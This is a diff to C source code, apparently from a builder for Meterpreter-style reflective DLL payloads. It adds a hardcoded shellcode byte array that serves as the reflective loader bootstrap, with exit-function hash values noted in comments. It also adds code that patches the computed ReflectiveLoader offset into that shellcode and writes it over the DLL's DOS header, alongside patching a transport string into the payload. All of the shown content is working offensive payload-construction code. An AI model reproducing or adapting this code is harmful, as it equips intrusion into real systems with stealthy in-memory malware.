@@ -46,6 +46,24 @@ either expressed or implied, of the FreeBSD Project.
 */
 #include "main.h"
 
+
+///////////////////////////
+// ReflectiveDLL bootstrap
+///////////////////////////
+
+char ReflectiveDllBootStrap[] = 
+	"\x4D\x5A\xE8\x00\x00\x00\x00\x5B\x52\x45\x55\x89\xE5\x81\xC3"
+	"\x00\x00\x00\x00"/* "\x37\x15\x00\x00"*/ //***CHANGE ME***// this is the hardcoded [offset-7] to ReflectiveLoader.
+	"\xFF\xD3\x89\xC3\x57\x68\x04\x00\x00\x00\x50\xFF\xD0\x68"
+	"\xE0\x1D\x2A\x0A"	//	EXITFUNC, this one is ExitThread
+						/*	'seh'     => 0xEA320EFE, # SetUnhandledExceptionFilter
+							'thread'  => 0x0A2A1DE0, # ExitThread
+							'process' => 0x56A2B5F0, # ExitProcess
+							'none'    => 0x5DE2C5AA, # GetLastError*/
+	"\x68\x05\x00\x00\x00\x50\xFF\xD3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE0";
+// End of the bootstrap.
+
+
 int wmain(int argc, wchar_t *argv[])
 {
 	PAYLOAD_SETTINGS payload_settings = {0};	// That's defined at main.h
@@ -376,9 +394,17 @@ int wmain(int argc, wchar_t *argv[])
 		dprintf(L"[*] Patching transport: Offset 0x%08x ->  \"%s\"\n", index, payload_settings.TRANSPORT );
 		PatchString(buffer, payload_settings.TRANSPORT, index, wcslen(payload_settings.TRANSPORT));
 
-		// Patching ReflectiveDLL bootstrap 
+		// Patching ReflectiveDLL bootstrap <- by Anwar ... thanks Anwar!
 		index = 0;  //rewind
-		dprintf(L"[*] Patching ReflectiveDll Bootstrap: \"MZ\" Offset 0x%08x\n", index);	
+
+		
+		DWORD Address = ReflectiveLoaderOffset((DWORD)buffer)-7;
+		dprintf(L"[*] Patching ReflectiveDll Bootstrap: \"MZ\" Offset 0x%08x\n", index);
+		unsigned char AddressChar[4];		
+		memcpy((void*)&AddressChar, (void*)(unsigned char*)&Address,4);	// What the !$#% ... will discuss with anwar those casted-casts...
+		memcpy(ReflectiveDllBootStrap + 15, (void*)AddressChar, 4);
+
+		//for ( unsigned int i=0; i<sizeof(ReflectiveDllBootStrap); i++) { printf("%x ",(unsigned char)ReflectiveDllBootStrap[i]); }  
 		memcpy(buffer, ReflectiveDllBootStrap, 62);//overwrite dos header with the ReflectiveDll bootstrap
 
 		//////////////////////////////////////////
